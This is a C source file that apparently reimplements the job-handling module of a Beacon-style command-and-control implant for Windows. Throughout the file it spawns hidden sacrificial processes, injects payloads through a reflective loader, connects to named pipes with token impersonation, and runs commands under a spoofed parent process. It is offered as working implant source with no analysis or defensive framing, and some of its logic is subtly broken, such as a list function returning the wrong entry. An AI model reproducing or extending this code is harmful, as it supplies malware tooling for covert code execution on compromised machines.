#include "pch.h"

#include "job.h"

#include "beacon.h"
#include "identity.h"
#include "pipe.h"
#include "spawn.h"


typedef struct _JOB_ENTRY
{
	int id;
	HANDLE process;
	HANDLE thread;
	__int64 pid;
	HANDLE hRead;
	HANDLE hWrite;
	struct _JOB_ENTRY* next;
	SHORT isPipe;
	SHORT isDead;
	int pid32;
	DWORD callbackType;
	BOOL isMsgMode;
	char description[64];
} JOB_ENTRY;

JOB_ENTRY* gJobs = NULL;

JOB_ENTRY* JobAdd(JOB_ENTRY* newJob)
{
	static DWORD gJobCurrentId = 0;

	JOB_ENTRY* job = gJobs;
	newJob->id = gJobCurrentId++;

	// Add to the end of the list
	if (job)
	{
		while (job->next)
			job = job->next;

		job->next = newJob;
	}
	else
	{
		gJobs = newJob;
	}

	return job;
}

void JobCleanup()
{
	// Close handles associated with completed jobs
	// If gJobs is not empty, iterate through the list
	;
	for (JOB_ENTRY* job = gJobs; job; job = job->next)
	{
		if (job->isDead)
		{
			if (!job->isPipe)
			{
				CloseHandle(job->process);
				CloseHandle(job->thread);
				CloseHandle(job->hRead);
				CloseHandle(job->hWrite);
			} else
			{
				DisconnectNamedPipe(job->hRead);
				CloseHandle(job->hRead);
			}
		}
	}

	JOB_ENTRY* prev = NULL;
	JOB_ENTRY** pNext;
	for (JOB_ENTRY* job = gJobs; job; job = *pNext)
	{
		if (!job->isDead)
		{
			prev = job;
			pNext = &job->next;
			continue;
		}

		if (prev)
			pNext = &prev->next;
		else
			pNext = &gJobs;

		*pNext = job->next;
		free(job);
	}

}

void JobKill(char* buffer, int size)
{
	datap parser;
	BeaconDataParse(&parser, buffer, size);
	short id = BeaconDataShort(&parser);

	for (JOB_ENTRY* job = gJobs; job; job = job->next)
	{
		if (job->id == id)
			job->isDead = TRUE;
	}

	JobCleanup();
}

void JobPrintAll()
{
	formatp format;
	BeaconFormatAlloc(&format, 0x8000);

	for (JOB_ENTRY* job = gJobs; job; job = job->next)
	{
		BeaconFormatPrintf(&format, "%d\t%d\t%s\n", job->id, job->pid32, job->description);
	}

	int size = BeaconDataLength(&format);
	char* buffer = BeaconDataOriginal(&format);
	BeaconOutput(CALLBACK_JOBS, buffer, size);
	BeaconFormatFree(&format);
}

JOB_ENTRY* JobRegisterProcess(PROCESS_INFORMATION* pi, HANDLE hRead, HANDLE hWrite, char* description)
{
	JOB_ENTRY* job = (JOB_ENTRY*)malloc(sizeof(JOB_ENTRY));
	if (!job)
		return NULL;

	job->process = pi->hProcess;
	job->thread = pi->hThread;
	job->next = NULL;
	job->isPipe = FALSE;
	job->hRead = hRead;
	job->hWrite = hWrite;
	job->pid = pi->dwProcessId;
	job->callbackType = CALLBACK_OUTPUT;
	job->isMsgMode = FALSE;
	job->pid32 = pi->dwProcessId;
	strncpy(job->description, description, sizeof(job->description));

	return JobAdd(job);
}

JOB_ENTRY* JobRegisterPipe(HANDLE hRead, int pid32, int callbackType, char* description, BOOL isMsgMode)
{
	JOB_ENTRY* job = (JOB_ENTRY*)malloc(sizeof(JOB_ENTRY));
	if (!job)
		return NULL;


	job->hWrite = INVALID_HANDLE_VALUE;
	job->next = NULL;
	job->isMsgMode = isMsgMode;
	job->hRead = hRead;
	job->isPipe = TRUE;
	job->pid32 = pid32;
	job->callbackType = callbackType;
	strncpy(job->description, description, sizeof(job->description));

	return JobAdd(job);
}

void JobRegister(char* buffer, int size, BOOL impersonate, BOOL isMsgMode)
{
	char filename[64] = { 0 };
	char description[64] = { 0 };

	datap parser;
	BeaconDataParse(&parser, buffer, size);
	int pid32 = BeaconDataInt(&parser);
	short callbackType = BeaconDataShort(&parser);
	short waitTime = BeaconDataShort(&parser);

	if (!BeaconDataStringCopySafe(&parser, filename, sizeof(filename)))
		return;

	if (!BeaconDataStringCopySafe(&parser, description, sizeof(description)))
		return;

	HANDLE hPipe;
	int attempts = 0;
	while (!PipeConnectWithToken(filename, &hPipe, impersonate ? 0x20000 : 0))
	{
		Sleep(500);
		if(++attempts >= 20)
		{
			DWORD lastError = GetLastError();
			LERROR("Could not connect to pipe: %s", LAST_ERROR_STR(lastError));
			BeaconErrorD(ERROR_CONNECT_TO_PIPE_FAILED, lastError);
			return;
		}
	}

	if (waitTime)
	{
		PipeWaitForData(hPipe, waitTime, 500);
	}

	JobRegisterPipe(hPipe, pid32, callbackType, description, isMsgMode);
}

void JobSpawnInternal(int callbackType, int waitTime, int reflectiveLoaderOffset, char* payload, int payloadLength, char* argument, int argumentLength, char* description, int descriptionLength, BOOL x86, BOOL ignoreToken)
{
	IdentityConditionalRevert(ignoreToken);

	STARTUPINFOA si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0 };
	SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };

	HANDLE hRead, hWrite;
	CreatePipe(&hRead, &hWrite, &sa, 0x100000);
	GetStartupInfoA(&si);
	si.hStdOutput = hWrite;
	si.hStdError = hWrite;
	si.hStdInput = NULL;
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;

	if (BeaconSpawnTemporaryProcess(x86, ignoreToken, &si, &pi))
	{
		Sleep(100);

		BeaconInjectTemporaryProcess(&pi, payload, payloadLength, reflectiveLoaderOffset, argument, argumentLength);

		if (waitTime)
		{
			PipeWaitForData(hRead, waitTime, 500);
		}

		JobRegisterProcess(&pi, hRead, hWrite, description);
	}

	IdentityConditionalImpersonate(ignoreToken);
}

void JobSpawn(char* buffer, int size, BOOL x86, BOOL ignoreToken)
{
#define MAX_DESCRIPTION 64
	datap* locals = BeaconDataAlloc(MAX_DESCRIPTION);
	char* description = BeaconDataPtr(locals, MAX_DESCRIPTION);

	datap parser;
	BeaconDataParse(&parser, buffer, size);
	short callbackType = BeaconDataShort(&parser);
	short waitTime = BeaconDataShort(&parser);
	int reflectiveLoaderOffset = BeaconDataInt(&parser);
	int descriptionLength = BeaconDataStringCopySafe(&parser, description, MAX_DESCRIPTION);
	int argumentLength = BeaconDataInt(&parser);
	char* argument = argumentLength ? BeaconDataPtr(&parser, argumentLength) : NULL;
	char* payload = BeaconDataBuffer(&parser);
	int payloadLength = BeaconDataLength(&parser);

	JobSpawnInternal(callbackType, waitTime, reflectiveLoaderOffset, payload, payloadLength, argument, argumentLength, description, descriptionLength, x86, ignoreToken);

	BeaconDataFree(locals);
}

void JobExecuteInternal(char* buffer, int length)
{
	STARTUPINFOA si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0 };
	SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };

	HANDLE hRead, hWrite;
	CreatePipe(&hRead, &hWrite, &sa, 0x100000);
	GetStartupInfoA(&si);
	si.hStdInput = NULL;
	si.hStdOutput = hWrite;
	si.hStdError = hWrite;
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;

	if(RunUnderParent(buffer, length, &si, &pi, CREATE_NEW_CONSOLE, FALSE))
	{
		WaitForSingleObject(pi.hProcess, 10000);
		PROCESS_INFORMATION lPi = { pi.hProcess, NULL, pi.dwProcessId, 0 };
		JOB_ENTRY* job = JobRegisterProcess(&lPi, hRead, hWrite, "process");
		job->callbackType = CALLBACK_OUTPUT_OEM;
	}
}